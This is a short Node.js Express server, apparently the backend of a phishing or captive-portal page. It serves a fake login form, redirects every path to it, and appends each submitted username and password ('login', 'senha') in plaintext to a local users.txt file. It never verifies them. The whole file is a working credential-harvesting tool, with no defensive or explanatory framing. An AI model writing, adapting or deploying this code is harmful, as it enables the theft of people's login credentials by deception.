const express = require("express")
const fs = require("fs")
const modRewrite = require('connect-modrewrite');

const filename = __dirname+"/users/users.txt"

app = express()
app.set('trust proxy', true);
app.set('view engine', 'ejs')
app.use(express.static('public'))
app.use(express.urlencoded({extended: true}))

app.use(modRewrite([
  '^/favicon\\.ico$ /favicon.ico [L]',
   '^(?!/$)^.*$ / [R=301,L,QSA]'
]));


app.get('/', (req,res)=>{
    res.render('login')
})

app.post('/', (req,res)=>{
    if(fs.existsSync(filename)){
        let content = "#--> "+req.body.login+":"+req.body.senha+"\n"
        fs.appendFile(filename,content, (err)=>{
            if(err){console.log("Erro ao salvar usuario: ", err)}
            else{console.log("Usuário salvo")}
        });
    }else{
        let content = ""
        content += "#--> "+req.body.login+":"+req.body.senha+"\n"
        fs.writeFileSync(filename,content)
    }
    res.redirect('/')
})


app.listen(80, ()=>{console.log("escutando na porta 80")})
